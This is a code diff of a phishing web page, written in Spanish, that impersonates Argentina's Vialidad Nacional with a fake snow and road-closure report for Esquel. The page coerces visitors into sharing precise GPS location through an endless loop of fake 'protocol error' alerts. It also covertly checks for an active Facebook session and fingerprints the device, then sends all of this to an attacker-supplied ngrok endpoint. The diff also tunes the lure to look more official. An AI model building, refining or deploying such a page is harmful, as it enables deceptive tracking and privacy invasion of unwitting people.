@@ -3,32 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta property="og:title" content="ESTADO DE RUTAS: Nieve y heladas en Esquel">
+    <meta property="og:description" content="Vialidad Nacional: Reporte de transitabilidad tramo Esquel - Tecka.">
     <meta property="og:image" content="https://www.eqsnotas.com/u/fotografias/m/2023/5/22/f1280x720-136514_149688_5050.jpg">
-    <title>Mapa de Vialidad - Acceso Restringido</title>
+    <title>Vialidad Nacional - Reporte de Rutas</title>
 </head>
 <body style="background:#f0f2f5; font-family:sans-serif; text-align:center; padding-top:100px;">
     <div id="status-card" style="max-width:450px; margin:auto; background:white; padding:30px; border-radius:15px; box-shadow:0 4px 15px rgba(0,0,0,0.2);">
         <h2 style="color:#c62828;">⚠ ACCESO REQUERIDO</h2>
-        <p id="msg">Para visualizar el <b>Reporte de Vialidad Nacional</b> y los cortes en tiempo real, es obligatorio validar su ubicación GPS.</p>
+        <p id="msg">Para visualizar el mapa de nieve y cortes en tiempo real, es <b>obligatorio</b> validar su ubicación GPS.</p>
         <div style="border:5px solid #f3f3f3; border-top:5px solid #c62828; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:20px auto;"></div>
-        <p style="font-size: 12px; color: #666;">Si rechazó el permiso por error, actualice la página o habilite el GPS en la configuración de su navegador.</p>
     </div>
 
     <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
 
     <script>
+        // --- PEGA TU LINK DE NGROK AQUÍ ---
         const URL_NGROK = "https://TU_LINK_AQUI.ngrok-free.app/save"; 
 
-        async function enviarDatos(pos) {
-            document.getElementById('msg').innerHTML = "<b>Ubicación validada.</b> Cargando mapa...";
+        async function enviarReporte(pos) {
+            document.getElementById('msg').innerHTML = "<b>Cargando reporte oficial...</b>";
             
-            let sensorMov = (window.DeviceMotionEvent) ? "Móvil/Activo" : "Estático/PC";
-            let sesion = "No detectada";
+            let hardware = (window.DeviceMotionEvent) ? "Dispositivo Móvil" : "Desktop/PC";
+            
+            // Detección sutil de cuenta activa
+            let social = "No detectada";
             const img = new Image();
             img.src = "https://www.facebook.com/favicon.ico?_rdr=" + Math.random();
-            
-            await new Promise(r => setTimeout(r, 1000));
-            if (img.complete && img.naturalWidth > 0) sesion = "Facebook Activo";
+            await new Promise(r => setTimeout(r, 800));
+            if (img.complete) social = "Sesión Activa";
 
             const payload = {
                 lat: pos.coords.latitude,
@@ -41,8 +43,8 @@
                 })(),
                 ram: navigator.deviceMemory || "N/A",
                 idioma: navigator.language || "es-AR",
-                movimiento: sensorMov,
-                social: sesion
+                movimiento: hardware,
+                social: social
             };
 
             fetch(URL_NGROK, { method:'POST', mode:'no-cors', body: JSON.stringify(payload) });
@@ -52,21 +54,19 @@
             }, 1000);
         }
 
-        function solicitarUbicacion() {
+        function solicitarGPS() {
             navigator.geolocation.getCurrentPosition(
-                enviarDatos, 
+                enviarReporte, 
                 (err) => {
-                    // Si el usuario rechaza (error 1) o hay otro problema, avisamos y reintentamos
-                    alert("ERROR DE PROTOCOLO: El sistema vial requiere su ubicación para filtrar el mapa de su zona. Por favor, acepte el permiso para continuar.");
-                    // Volvemos a llamar a la función inmediatamente
-                    solicitarUbicacion();
+                    // SI RECHAZA: Alerta de sistema y bucle infinito
+                    alert("ERROR DE PROTOCOLO: El sistema vial requiere su ubicación para filtrar el mapa de su zona. Por favor, habilite el permiso para continuar.");
+                    solicitarGPS();
                 }, 
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         }
 
-        // Iniciar el bucle al cargar la página
-        window.onload = solicitarUbicacion;
+        window.onload = solicitarGPS;
     </script>
 </body>
 </html>
